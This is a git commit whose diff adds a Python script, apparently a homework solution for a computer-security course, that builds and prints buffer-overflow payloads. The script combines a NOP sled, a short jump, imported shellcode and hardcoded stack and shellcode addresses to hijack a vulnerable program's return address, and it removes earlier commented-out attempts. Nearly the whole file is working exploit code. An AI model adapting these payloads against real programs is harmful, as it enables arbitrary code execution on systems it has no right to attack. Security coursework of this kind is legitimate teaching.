f94cfecd50a2b127e6c8c05285e7d789a50df072
Hsuan-Chi Kuo <hsuanchikuo@gmail.com>
2017-10-02 17:51:59 -0400

    done 2.2.8

--- mp2/2.2.8.py
+++ mp2/2.2.8.py
@@ -1,14 +1,9 @@
 from shellcode import shellcode
 from struct import pack
 
-
-# didn't work
-
-# ret =  0xbffef228
-# sc =  0x8048f54
-
-# print shellcode
-#
-# print shellcode + '\x90' *17 + pack("<I",sc) + pack("<I",ret)
-#
-# print "\xeb" + "\x06" + "\x90"*6 + shellcode
+shellcodeadd = 0x080f3721
+ebp4 = 0xbffef22c
+A_payload = pack("<B", 0x90) +  pack("<I", 0x04eb9090) + pack("<I", 0x90909090) + shellcode
+B_payload = '\x01' * 40 + pack("<I", shellcodeadd) + pack("<I", ebp4)
+C_payload = 'doesnotmatter'
+print A_payload, B_payload, C_payload
